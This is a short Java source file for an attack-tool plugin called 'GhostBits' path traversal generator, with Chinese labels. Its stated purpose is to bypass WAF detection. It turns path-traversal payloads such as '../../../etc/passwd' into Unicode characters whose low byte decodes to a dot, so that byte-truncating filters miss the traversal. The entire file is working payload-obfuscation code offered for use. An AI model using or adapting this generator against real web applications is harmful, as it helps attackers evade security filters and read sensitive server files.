import java.util.Random;

public class PathTraversalPlugin implements com.ghostbits.plugins.Plugin {
    
    private Random random = new Random();
    
    public String getName() {
        return "GhostBits 路径穿越生成器";
    }
    
    public String getVersion() {
        return "1.0.0";
    }
    
    public String getAuthor() {
        return "xstteam";
    }
    
    public String getDescription() {
        return "将路径穿越Payload转换为GhostBits格式，绕过WAF检测";
    }
    
    public String getExampleInput() {
        return "示例: ../../../etc/passwd";
    }
    
    public String execute(String input) {
        if (input == null || input.trim().isEmpty()) {
            return "错误: 请输入目标路径\n\n示例: ../../../etc/passwd";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("========== GhostBits 路径穿越 ==========\n");
        result.append("原始: ").append(input.trim()).append("\n");
        result.append("转换: ").append(convertPathTraversal(input.trim())).append("\n");
        result.append("========================================\n");
        
        return result.toString();
    }
    
    private String convertPathTraversal(String path) {
        // 把路径中的 "../" 转换
        String ghostDot = generateGhostDot();
        return path.replace("../", ghostDot + ghostDot + "/");
    }
    
    private String generateGhostDot() {
        int highByte = 0xB0 + random.nextInt(0x28);
        char ghostDot = (char) ((highByte << 8) | 0x2E); // 0x2E = '.'
        return String.valueOf(ghostDot);
    }
}
